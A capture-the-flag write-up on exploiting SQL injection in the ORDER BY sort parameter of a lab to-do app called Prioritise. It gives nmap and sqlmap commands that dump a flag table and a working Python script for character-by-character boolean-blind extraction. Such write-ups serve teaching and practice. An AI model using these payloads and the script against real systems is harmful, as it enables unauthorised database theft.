# 📝 Prioritise

## Challenge Description

We are given a to-do list web application called **Prioritise**, where tasks can be sorted by different fields (title, done, due date). The challenge description suggests that the system may not be secure. Our goal is to investigate and retrieve the hidden flag.

---

## Reconnaissance

We begin with an `nmap` scan:

```bash
nmap -sCV 10.201.61.2
```

### Results

* **Port 22** → OpenSSH 8.2p1 (Ubuntu)
* **Port 80** → HTTP service running a custom web app (`Prioritise`)

Accessing the web service at `http://10.201.61.2/` shows a to-do list app where tasks can be created, sorted, and deleted.

---

## Observations

The app allows sorting by adding a query parameter to the URL:

* `http://10.201.61.2/?order=title`
* `http://10.201.61.2/?order=done`
* `http://10.201.61.2/?order=date`

This strongly suggests that the `order` parameter is used directly in an SQL `ORDER BY` clause.

### Manual Test

By modifying the parameter:

```http
http://10.201.61.2/?order=title DESC--
```

The order of results is reversed. This confirms the presence of **SQL injection in ORDER BY**.

---

## Exploitation with sqlmap

We confirm injection with sqlmap:

```bash
sqlmap -u "http://10.201.61.2/?order=title" -p order --level=5 --risk=3 --batch
```

### Results

* Backend DBMS: **SQLite**
* Injection type: **Boolean-based blind**

Fetching tables:

```bash
sqlmap -u "http://10.201.61.2/?order=title" -p order --tables
```

Discovered tables:

```
flag
todos
```

Dumping the `flag` table:

```bash
sqlmap -u "http://10.201.61.2/?order=title" -p order -T flag --dump
```

Output:

```
flag{~~~}
```

✅ **Flag captured!**

---

## Alternative: Manual Blind SQLi Script

For educational purposes, we can exploit manually without sqlmap. Below is a Python script that extracts data character by character by comparing the first sorted element.

```python
import requests
import string
from bs4 import BeautifulSoup
import time

URL = "http://10.201.61.2"
CHARS = string.ascii_letters + string.digits + "{}_-"
session = requests.Session()

def get_first_title(order_value):
    r = session.get(f"{URL}/?order={order_value}")
    soup = BeautifulSoup(r.text, "html.parser")
    first_td = soup.find_all("td")
    if len(first_td) >= 2:
        return first_td[1].get_text(strip=True)
    return None

baseline_title = get_first_title("title")
print("[*] Baseline first title:", baseline_title)

def check_query(payload):
    first = get_first_title(payload)
    time.sleep(0.5)
    return first == baseline_title

def brute_force_query(sql_expr, offset=0):
    result = ""
    while True:
        found = False
        for c in CHARS:
            payload = f"(CASE WHEN (SELECT SUBSTR((SELECT {sql_expr} LIMIT 1 OFFSET {offset}),{len(result)+1},1))='{c}' THEN title ELSE date END)"
            if check_query(payload):
                result += c
                print("[+] Current:", result)
                if c == "}":
                    return result
                found = True
                break
        if not found:
            break
    return result

print("[*] Dumping flag...")
flag = brute_force_query("flag FROM flag")
print("[*] Final Flag:", flag)
```

⚠️ This approach is very slow due to the need for multiple requests per character, but it demonstrates how **blind SQLi via ORDER BY** can be exploited manually.

---

## Key Takeaways

* The vulnerability is **SQL Injection via ORDER BY parameter**.
* Backend DBMS: **SQLite**.
* Using automated tools like **sqlmap** is efficient, but manual exploitation is possible.

